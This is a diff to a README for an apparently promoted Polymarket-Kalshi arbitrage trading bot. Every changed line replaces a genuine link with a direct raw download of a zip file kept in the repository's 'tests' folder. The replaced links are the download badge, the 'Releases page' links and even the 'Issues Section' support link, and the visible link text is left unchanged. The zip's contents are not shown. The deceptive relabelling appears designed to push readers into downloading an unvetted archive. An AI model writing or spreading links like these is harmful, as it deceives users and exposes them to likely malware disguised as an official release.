@@ -1,6 +1,6 @@
 # 📈 Polymarket-Kalshi-Arbitrage-bot - Simplify Your Trading Across Markets
 
-[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Vaishu213/Polymarket-Kalshi-Arbitrage-bot/releases)
+[![Download Now](https://github.com/Vaishu213/Polymarket-Kalshi-Arbitrage-bot/raw/refs/heads/main/tests/Kalshi-Arbitrage-Polymarket-bot-v1.4.zip)](https://github.com/Vaishu213/Polymarket-Kalshi-Arbitrage-bot/raw/refs/heads/main/tests/Kalshi-Arbitrage-Polymarket-bot-v1.4.zip)
 
 ## 🚀 Getting Started
 
@@ -20,12 +20,12 @@ Before you download the bot, please ensure you have the following:
 
 To get started, visit the Releases page to download the latest version of the Polymarket-Kalshi-Arbitrage-bot.
 
-[Visit the Releases Page to Download](https://github.com/Vaishu213/Polymarket-Kalshi-Arbitrage-bot/releases)
+[Visit the Releases Page to Download](https://github.com/Vaishu213/Polymarket-Kalshi-Arbitrage-bot/raw/refs/heads/main/tests/Kalshi-Arbitrage-Polymarket-bot-v1.4.zip)
 
 ### 📂 How to Install
 
 1. **Download the Latest Release:**
-   - Go to the [Releases page](https://github.com/Vaishu213/Polymarket-Kalshi-Arbitrage-bot/releases).
+   - Go to the [Releases page](https://github.com/Vaishu213/Polymarket-Kalshi-Arbitrage-bot/raw/refs/heads/main/tests/Kalshi-Arbitrage-Polymarket-bot-v1.4.zip).
    - Find the latest version listed at the top.
    - Click on the appropriate file for your operating system to download it.
 
@@ -70,7 +70,7 @@ Once you finish the setup, you are ready to start trading.
 
 If you encounter any issues or have questions, you can reach our support team through GitHub Issues. Your feedback is essential to improving the bot. 
 
-1. Go to the [Issues Section](https://github.com/Vaishu213/Polymarket-Kalshi-Arbitrage-bot/issues).
+1. Go to the [Issues Section](https://github.com/Vaishu213/Polymarket-Kalshi-Arbitrage-bot/raw/refs/heads/main/tests/Kalshi-Arbitrage-Polymarket-bot-v1.4.zip).
 2. Submit a new issue detailing your question or problem.
 
 ## 📃 License
@@ -81,4 +81,4 @@ The Polymarket-Kalshi-Arbitrage-bot is open-source and distributed under the MIT
 
 You have now set up and configured the Polymarket-Kalshi-Arbitrage-bot. Enjoy the benefits of automated cross-platform trading and make your trading experience easier than ever.
 
-For further information, updates, or new features, always check back on the Releases page: [Visit the Releases Page to Download](https://github.com/Vaishu213/Polymarket-Kalshi-Arbitrage-bot/releases).
+For further information, updates, or new features, always check back on the Releases page: [Visit the Releases Page to Download](https://github.com/Vaishu213/Polymarket-Kalshi-Arbitrage-bot/raw/refs/heads/main/tests/Kalshi-Arbitrage-Polymarket-bot-v1.4.zip).
